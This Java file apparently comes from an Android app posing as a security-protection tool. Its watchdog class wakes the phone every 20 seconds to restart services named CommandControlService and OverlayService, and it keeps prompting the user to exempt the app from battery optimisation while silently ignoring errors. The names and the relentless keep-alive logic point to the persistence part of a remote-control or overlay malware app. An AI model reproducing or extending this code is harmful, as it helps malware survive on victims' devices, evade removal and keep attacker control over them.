package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class KryptosWatchdog {

    private static final String TAG = "KryptosWatchdog";
    public static final String ACTION_WATCHDOG = "com.seguranca.protecao.WATCHDOG";
    public static final long PERIOD_MS = 20000L;
    private static volatile long lastBatteryAsk = 0L;

    public static void arm(Context ctx) { schedule(ctx, PERIOD_MS); }
    public static void armSoon(Context ctx, long ms) { schedule(ctx, ms); }

    private static void schedule(Context ctx, long ms) {
        try {
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            PendingIntent pi = pending(ctx);
            long at = System.currentTimeMillis() + ms;
            try { am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, pi); }
            catch (Throwable t) { am.set(AlarmManager.RTC_WAKEUP, at, pi); }
        } catch (Throwable t) { Log.e(TAG, "schedule: " + t); }
    }

    private static PendingIntent pending(Context ctx) {
        Intent i = new Intent(ctx, KryptosWatchdogReceiver.class);
        i.setAction(ACTION_WATCHDOG);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;
        return PendingIntent.getBroadcast(ctx, 7771, i, flags);
    }

    public static void ensureServices(Context ctx) {
        startFg(ctx, CommandControlService.class);
        startBg(ctx, OverlayService.class);
    }

    public static void requestBatteryExemption(Context ctx) {
        try {
            android.os.PowerManager pm = (android.os.PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null || pm.isIgnoringBatteryOptimizations(ctx.getPackageName())) return;
            long now = System.currentTimeMillis();
            if (now - lastBatteryAsk < 300000L) return;
            lastBatteryAsk = now;
            Intent i = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Throwable t) { }
    }

    private static void startFg(Context ctx, Class<?> cls) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(new Intent(ctx, cls));
            else ctx.startService(new Intent(ctx, cls));
        } catch (Throwable t) {
            try { ctx.startService(new Intent(ctx, cls)); } catch (Throwable t2) { }
        }
    }

    private static void startBg(Context ctx, Class<?> cls) {
        try { ctx.startService(new Intent(ctx, cls)); } catch (Throwable t) { }
    }
}
